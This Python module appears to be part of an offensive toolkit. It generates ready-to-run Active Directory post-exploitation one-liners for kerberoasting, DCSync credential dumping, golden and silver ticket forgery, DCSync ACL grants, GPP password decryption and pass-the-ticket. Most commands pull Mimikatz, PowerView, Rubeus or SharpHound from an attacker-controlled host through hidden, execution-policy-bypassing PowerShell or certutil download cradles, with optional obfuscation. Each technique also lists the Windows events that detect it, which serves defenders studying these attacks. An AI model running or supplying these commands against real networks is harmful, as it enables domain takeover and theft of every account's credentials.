"""
Active Directory attack template generator.
Returns PowerShell and cmd.exe one-liners for common AD post-exploitation
techniques including kerberoasting, ticket attacks, DCSync, and enumeration.
For use in authorized red team exercises only.
"""
from dataclasses import dataclass, field

from .obfuscate import ps_tick_marks

_RUBEUS_PATH = r"C:\Windows\Temp\Rubeus.exe"


def _iex_cradle(url: str, body: str) -> str:
    return f"IEX (New-Object Net.WebClient).DownloadString('{url}');{body}"


SUPPORTED_TECHNIQUES = (
    "kerberoast",
    "asrep_roast",
    "dcsync",
    "bloodhound_collect",
    "ldap_enum",
    "pass_the_ticket",
    "golden_ticket",
    "silver_ticket",
    "acl_dcsync",
    "gpp_password",
    "overpass_the_hash",
    "zerologon_check",
)


@dataclass
class ADAttackResult:
    command: str
    technique: str
    notes: str
    techniques: list[str] = field(default_factory=list)
    risk: str = "HIGH"
    detections: list[str] = field(default_factory=list)


# ── Techniques ────────────────────────────────────────────────────────────────

def _kerberoast(domain: str, dc_host: str, username: str, password: str,
                hash_nt: str, outfile: str, obfuscate: bool,
                lhost: str, lport: int) -> ADAttackResult:
    cmd = _iex_cradle(
        f"http://{lhost}:{lport}/PowerView.ps1",
        f"Invoke-Kerberoast -Domain {domain} -OutputFormat Hashcat"
        f" | Select-Object -ExpandProperty Hash | Out-File -Encoding ASCII {outfile}",
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return ADAttackResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="kerberoast",
        notes=(
            f"PowerView.ps1 served from http://{lhost}:{lport}/. "
            f"Hashes written to {outfile}. "
            f"Crack with: hashcat -m 13100 {outfile} /usr/share/wordlists/rockyou.txt --force"
        ),
        techniques=["T1558.003"],
        risk="HIGH",
        detections=[
            "Event 4769 (Kerberos Service Ticket Requested) for RC4 tickets",
            "Spike in LDAP queries for SPNs",
            "Multiple 4769 events from single source in short window",
        ],
    )


def _asrep_roast(domain: str, dc_host: str, username: str, password: str,
                 hash_nt: str, outfile: str, obfuscate: bool,
                 lhost: str, lport: int) -> ADAttackResult:
    cmd = (
        f"certutil -urlcache -split -f http://{lhost}:{lport}/Rubeus.exe {_RUBEUS_PATH} && "
        f"{_RUBEUS_PATH} asreproast /domain:{domain} /dc:{dc_host} /format:hashcat /outfile:{outfile}"
    )
    return ADAttackResult(
        command=cmd,
        technique="asrep_roast",
        notes=(
            f"Rubeus.exe served from http://{lhost}:{lport}/. "
            "Targets accounts with 'Do not require Kerberos preauthentication'. "
            f"Crack: hashcat -m 18200 {outfile} rockyou.txt"
        ),
        techniques=["T1558.004"],
        risk="HIGH",
        detections=[
            "Event 4768 with pre-auth type 0 (no preauthentication)",
            "certutil network connections to staging server",
            "Rubeus.exe process creation (if not renamed)",
        ],
    )


def _dcsync(domain: str, dc_host: str, username: str, password: str,
            hash_nt: str, outfile: str, obfuscate: bool,
            lhost: str, lport: int) -> ADAttackResult:
    cmd = _iex_cradle(
        f"http://{lhost}:{lport}/Invoke-Mimikatz.ps1",
        f"Invoke-Mimikatz -Command '\"lsadump::dcsync /domain:{domain} /all /csv\"'"
        f" | Out-File -Encoding ASCII {outfile}",
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return ADAttackResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="dcsync",
        notes=(
            "Requires Domain Admin or DCSync ACL rights. "
            "Dump contains NTLM hashes for all accounts. "
            "For single account: /user:krbtgt"
        ),
        techniques=["T1003.006"],
        risk="CRITICAL",
        detections=[
            "Event 4662 with GetChangesAll replication permission from non-DC",
            "Directory Replication Service RPC calls from workstation",
            "Invoke-Mimikatz script block logging (Event 4104)",
        ],
    )


def _bloodhound_collect(domain: str, dc_host: str, username: str, password: str,
                        hash_nt: str, outfile: str, obfuscate: bool,
                        lhost: str, lport: int) -> ADAttackResult:
    sharp = "C:\\Windows\\Temp\\SharpHound.exe"
    zip_out = "C:\\Windows\\Temp\\bh_out.zip"
    cmd = (
        f"certutil -urlcache -split -f http://{lhost}:{lport}/SharpHound.exe {sharp} && "
        f"{sharp} --CollectionMethods All --Domain {domain} --ZipFileName {zip_out} && "
        f"del /f /q {sharp}"
    )
    return ADAttackResult(
        command=cmd,
        technique="bloodhound_collect",
        notes=(
            f"SharpHound.exe served from http://{lhost}:{lport}/. "
            f"Import {zip_out} into BloodHound GUI. "
            "--CollectionMethods All includes sessions, ACLs, GPOs, trusts, containers."
        ),
        techniques=["T1069.002", "T1087.002", "T1482"],
        risk="HIGH",
        detections=[
            "LDAP queries for user/group/computer enumeration in rapid succession",
            "SMB session enumeration (Event 4624 + net session queries)",
            "certutil download from staging IP",
        ],
    )


def _ldap_enum(domain: str, dc_host: str, username: str, password: str,
               hash_nt: str, outfile: str, obfuscate: bool,
               lhost: str, lport: int) -> ADAttackResult:
    cmd = (
        f"$d=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();"
        f"$r=$d.GetDirectoryEntry();"
        f"$s=New-Object System.DirectoryServices.DirectorySearcher($r);"
        f"$s.Filter='(objectClass=user)';"
        f"$s.PropertiesToLoad.Add('samaccountname')|Out-Null;"
        f"$s.PropertiesToLoad.Add('memberof')|Out-Null;"
        f"$res=$s.FindAll();"
        f"$res | ForEach-Object {{ [PSCustomObject]@{{User=$_.Properties['samaccountname'][0];"
        f"Groups=($_.Properties['memberof'] -join ',')}} }}"
        f" | Export-Csv -NoTypeInformation {outfile}"
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return ADAttackResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="ldap_enum",
        notes=(
            f"Native PS LDAP — no RSAT or external modules. "
            f"Enumerates domain users and group memberships. Output: {outfile}"
        ),
        techniques=["T1087.002", "T1069.002"],
        risk="MEDIUM",
        detections=[
            "LDAP search queries with objectClass=user filter from non-admin host",
            "High-volume LDAP traffic (Event 1644 with LDAP stats enabled)",
        ],
    )


def _pass_the_ticket(domain: str, dc_host: str, username: str, password: str,
                     hash_nt: str, outfile: str, obfuscate: bool,
                     lhost: str, lport: int) -> ADAttackResult:
    cred_arg = f"/rc4:{hash_nt}" if hash_nt else f"/password:{password}"
    cmd = (
        f"certutil -urlcache -split -f http://{lhost}:{lport}/Rubeus.exe {_RUBEUS_PATH} && "
        f"{_RUBEUS_PATH} asktgt /user:{username} {cred_arg} /domain:{domain} /dc:{dc_host} /ptt"
    )
    return ADAttackResult(
        command=cmd,
        technique="pass_the_ticket",
        notes=(
            "TGT injected into current session (/ptt). "
            "Verify: klist. Use Rubeus dump to extract .kirbi for offline use."
        ),
        techniques=["T1550.003"],
        risk="HIGH",
        detections=[
            "Event 4768 (TGT request) from non-DC machine",
            "Unusual logon type 9 (NewCredentials) or 3 after ticket injection",
            "Rubeus.exe process creation",
        ],
    )


def _golden_ticket(domain: str, dc_host: str, username: str, password: str,
                   hash_nt: str, outfile: str, obfuscate: bool,
                   lhost: str, lport: int) -> ADAttackResult:
    cmd = _iex_cradle(
        f"http://{lhost}:{lport}/Invoke-Mimikatz.ps1",
        f"Invoke-Mimikatz -Command '\"kerberos::golden /user:Administrator"
        f" /domain:{domain} /sid:DOMAIN-SID /krbtgt:KRBTGT_NTHASH /ptt\"'",
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return ADAttackResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="golden_ticket",
        notes=(
            "Replace DOMAIN-SID (Get-ADDomain | Select-Object DomainSID) and "
            "KRBTGT_NTHASH (from dcsync). Valid 10 years by default. /ptt injects immediately."
        ),
        techniques=["T1558.001"],
        risk="CRITICAL",
        detections=[
            "Event 4769 with abnormal ticket lifetime (>10h)",
            "Ticket with -500 RID but no corresponding 4768 from DC",
            "Forged PAC detection (if KDC PAC validation enabled)",
        ],
    )


def _silver_ticket(domain: str, dc_host: str, username: str, password: str,
                   hash_nt: str, outfile: str, obfuscate: bool,
                   lhost: str, lport: int) -> ADAttackResult:
    cmd = _iex_cradle(
        f"http://{lhost}:{lport}/Invoke-Mimikatz.ps1",
        f"Invoke-Mimikatz -Command '\"kerberos::golden /user:Administrator"
        f" /domain:{domain} /sid:DOMAIN-SID /target:{dc_host}.{domain}"
        f" /service:cifs /rc4:TARGET_MACHINE_NTHASH /ptt\"'",
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return ADAttackResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="silver_ticket",
        notes=(
            "Replace DOMAIN-SID and TARGET_MACHINE_NTHASH (machine account hash from dcsync). "
            "/service:cifs gives SMB access. No DC contact required — stealthier than golden ticket."
        ),
        techniques=["T1558.002"],
        risk="CRITICAL",
        detections=[
            "Service ticket with no corresponding TGT request (no Event 4768 before 4769)",
            "Missing PAC or forged PAC on service tickets",
            "SMB access without prior authentication to DC",
        ],
    )


def _acl_dcsync(domain: str, dc_host: str, username: str, password: str,
                hash_nt: str, outfile: str, obfuscate: bool,
                lhost: str, lport: int) -> ADAttackResult:
    dc_components = ",".join(f"DC={part}" for part in domain.split("."))
    cmd = _iex_cradle(
        f"http://{lhost}:{lport}/PowerView.ps1",
        f"Add-DomainObjectAcl -TargetIdentity '{dc_components}'"
        f" -PrincipalIdentity {username} -Rights DCSync -Domain {domain} -Verbose",
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return ADAttackResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="acl_dcsync",
        notes=(
            f"Run as Domain Admin. Grants {username} the Replicating Directory Changes + "
            "Replicating Directory Changes All rights. Then run dcsync technique as that user."
        ),
        techniques=["T1484.001", "T1003.006"],
        risk="CRITICAL",
        detections=[
            "Event 5136 (Directory Service Object Modified) on domain NC head",
            "ACE additions with DS-Replication-Get-Changes GUID",
            "PowerView script block logging (Event 4104)",
        ],
    )


def _gpp_password(domain: str, dc_host: str, username: str, password: str,
                  hash_nt: str, outfile: str, obfuscate: bool,
                  lhost: str, lport: int) -> ADAttackResult:
    # AES key is public knowledge since MS14-025 — not a credential, it's a fixed Microsoft constant
    aes_key = (
        "0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,"
        "0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b"
    )
    cmd = (
        f"$key=[byte[]]@({aes_key});"
        f"$files=Get-ChildItem -Path '\\\\{domain}\\SYSVOL' -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml';"
        f"$files|ForEach-Object{{[xml]$x=Get-Content $_.FullName;"
        f"$x.Groups.User|Where-Object{{$_.Properties.cpassword}}|ForEach-Object{{"
        f"$enc=[Convert]::FromBase64String($_.Properties.cpassword);"
        f"$aes=New-Object Security.Cryptography.AesCryptoServiceProvider;"
        f"$aes.Key=$key;$aes.IV=New-Object byte[] 16;$aes.Padding='PKCS7';$aes.Mode='CBC';"
        f"$dec=[Text.Encoding]::Unicode.GetString(($aes.CreateDecryptor()).TransformFinalBlock($enc,0,$enc.Length));"
        f"[PSCustomObject]@{{File=$_.FullName;User=$_.Properties.userName;Pass=$dec}}"
        f"}}}} | Format-List"
    )
    if obfuscate:
        cmd = ps_tick_marks(cmd)
    return ADAttackResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{cmd}\"",
        technique="gpp_password",
        notes=(
            "AES key is public (MS14-025). "
            "Searches SYSVOL for GPP cpassword fields. No tools required."
        ),
        techniques=["T1552.006"],
        risk="HIGH",
        detections=[
            "SYSVOL read from non-domain-joined or unusual host",
            "File access to Groups.xml paths (\\\\domain\\SYSVOL\\...\\Groups.xml)",
        ],
    )


def _overpass_the_hash(domain: str, dc_host: str, username: str, password: str,
                       hash_nt: str, outfile: str, obfuscate: bool,
                       lhost: str, lport: int) -> ADAttackResult:
    cmd = (
        f"certutil -urlcache -split -f http://{lhost}:{lport}/Rubeus.exe {_RUBEUS_PATH} && "
        f"{_RUBEUS_PATH} asktgt /user:{username} /rc4:{hash_nt} /domain:{domain} /dc:{dc_host} /ptt"
    )
    return ADAttackResult(
        command=cmd,
        technique="overpass_the_hash",
        notes=(
            "RC4 (NT hash) used to request TGT — avoids plaintext password. "
            "/ptt injects ticket into session. "
            "Stronger opsec than direct PTH — generates TGT event (4768) not NTLM (4776)."
        ),
        techniques=["T1550.002"],
        risk="HIGH",
        detections=[
            "Event 4768 with RC4 encryption type from workstation (not DC)",
            "certutil outbound connection to staging server",
            "Rubeus.exe process creation",
        ],
    )


def _zerologon_check(domain: str, dc_host: str, username: str, password: str,
                     hash_nt: str, outfile: str, obfuscate: bool,
                     lhost: str, lport: int, dc_ip: str = "DC_IP_ADDRESS") -> ADAttackResult:
    # dc_ip is passed via the optional `dc_ip` kwarg from the caller; defaults to a placeholder
    # if the caller does not supply one (preserves prior behavior for legacy callers).
    cmd = f"python3 /opt/impacket/examples/zerologon_tester.py {dc_host} {dc_ip}"
    return ADAttackResult(
        command=cmd,
        technique="zerologon_check",
        notes=(
            f"Linux/impacket tool. Install: pip install impacket. "
            f"Non-destructive check only — does NOT exploit. dc_ip={dc_ip}. "
            "Exploitation changes DC machine account password; only run in lab or with "
            "explicit written permission and a recovery plan."
        ),
        techniques=["T1210"],
        risk="CRITICAL",
        detections=[
            "Abnormal Netlogon RPC traffic to DC (CVE-2020-1472 signature)",
            "Multiple failed authentication attempts from single source",
            "DC machine account password change without admin action (if exploited)",
        ],
    )


# ── Public API ─────────────────────────────────────────────────────────────────

_DISPATCH = {
    "kerberoast": _kerberoast,
    "asrep_roast": _asrep_roast,
    "dcsync": _dcsync,
    "bloodhound_collect": _bloodhound_collect,
    "ldap_enum": _ldap_enum,
    "pass_the_ticket": _pass_the_ticket,
    "golden_ticket": _golden_ticket,
    "silver_ticket": _silver_ticket,
    "acl_dcsync": _acl_dcsync,
    "gpp_password": _gpp_password,
    "overpass_the_hash": _overpass_the_hash,
    "zerologon_check": _zerologon_check,
}


def generate_adattack(
    technique: str,
    domain: str = "DOMAIN.LOCAL",
    dc_host: str = "DC01",
    username: str = "USER",
    password: str = "PASS",
    hash_nt: str = "",
    outfile: str = "C:\\Windows\\Temp\\ad_out.txt",
    obfuscate: bool = True,
    lhost: str = "192.168.1.100",
    lport: int = 8080,
    dc_ip: str | None = None,
) -> ADAttackResult:
    if technique not in _DISPATCH:
        raise ValueError(f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
    fn = _DISPATCH[technique]
    # _zerologon_check accepts an optional dc_ip kwarg; pass it through when provided.
    if technique == "zerologon_check":
        return fn(domain, dc_host, username, password, hash_nt, outfile, obfuscate, lhost, lport, dc_ip=dc_ip or "DC_IP_ADDRESS")
    return fn(domain, dc_host, username, password, hash_nt, outfile, obfuscate, lhost, lport)
